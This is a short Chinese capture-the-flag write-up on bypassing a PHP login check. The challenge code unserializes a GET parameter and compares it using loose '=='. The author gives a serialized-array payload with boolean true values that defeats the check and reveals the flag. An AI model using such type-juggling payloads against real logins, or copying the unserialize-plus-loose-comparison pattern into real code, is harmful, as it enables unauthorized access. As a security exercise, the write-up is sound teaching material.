# 又见php登录绕过
先看代码
``` php
<?php
show_source(__FILE__);
$username  = "this_is_secret"; 
$password  = "this_is_not_known_to_you"; 
include("flag.php");//here I changed those two 
$info = isset($_GET['info'])? $_GET['info']: "" ;
$data_unserialize = unserialize($info);
if ($data_unserialize['username']==$username&&$data_unserialize['password']==$password){
    echo $flag;
}else{
    echo "username or password error!";

}

?>
```
可得知需要穿透username和password，又因为用 `==`是一种弱条件的等，用它进行比较的时候，会发生类型转换。
所以此题目只需要穿入
```php
array{
    "username"=>true,
    "passowrd"=>true
}
```
的序列化值就可以了,最终的payload为。
```
?info=a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```